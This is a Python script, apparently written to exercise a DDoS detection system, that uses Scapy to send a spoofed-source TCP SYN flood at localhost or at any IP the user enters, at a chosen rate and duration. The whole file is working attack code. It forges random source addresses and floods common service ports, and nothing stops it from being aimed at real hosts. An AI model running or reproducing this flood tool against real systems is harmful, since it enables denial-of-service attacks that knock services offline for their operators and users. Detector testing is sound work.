# simulate_attack.py - Real DDoS Attack Simulation
from scapy.all import IP, TCP, send, RandIP, sr1
import random
import time
import sys
import platform

if platform.system() == "Windows":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

def simulate_ddos(target_ip="127.0.0.1", duration=30, packets_per_second=500):
    """Real DDoS attack simulation with high packet rate"""
    print("="*70)
    print("!!! DDoS ATTACK SIMULATOR !!!")
    print("="*70)
    print(f"Target: {target_ip}")
    print(f"Duration: {duration} seconds")
    print(f"Rate: {packets_per_second} packets/second")
    print("="*70)
    print("[WARNING] This will trigger DDoS detection!")
    print("Press Ctrl+C to stop\n")
    
    time.sleep(2)
    
    end_time = time.time() + duration
    packet_count = 0
    start_time = time.time()
    
    try:
        while time.time() < end_time:
            # Send multiple packets in burst
            burst_size = packets_per_second // 20
            if burst_size < 1:
                burst_size = 1
            
            for _ in range(burst_size):
                # Random source IP (distributed attack)
                src_ip = f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                dst_ip = target_ip
                
                # Create attack packet
                packet = IP(src=src_ip, dst=dst_ip)/TCP(
                    sport=random.randint(1000, 65535),
                    dport=random.choice([80, 443, 8080, 22, 53]),
                    flags="S"  # SYN flag for SYN flood
                )
                
                send(packet, verbose=False)
                packet_count += 1
            
            # Show progress
            elapsed = time.time() - start_time
            current_rate = packet_count / elapsed if elapsed > 0 else 0
            print(f"[ATTACK] Sent: {packet_count} packets | Rate: {current_rate:.0f} pps", end='\r')
            time.sleep(0.05)  # Small delay to control rate
            
    except KeyboardInterrupt:
        print(f"\n\n[STOPPED] Attack interrupted")
    
    elapsed = time.time() - start_time
    print(f"\n\n{'='*70}")
    print(f"ATTACK COMPLETED")
    print(f"{'='*70}")
    print(f"Total packets sent: {packet_count}")
    print(f"Average rate: {packet_count/elapsed:.0f} pps")
    print(f"Duration: {elapsed:.1f} seconds")
    print(f"{'='*70}")

if __name__ == "__main__":
    print("\nDDoS Attack Simulator")
    print("1. Attack localhost (127.0.0.1)")
    print("2. Attack specific IP")
    
    choice = input("\nChoice (1/2): ").strip()
    
    if choice == "2":
        target = input("Enter target IP: ").strip()
    else:
        target = "127.0.0.1"
    
    try:
        rate = int(input("Packets per second (default 500): ") or "500")
        duration = int(input("Duration in seconds (default 30): ") or "30")
    except:
        rate = 500
        duration = 30
    
    simulate_ddos(target, duration, rate)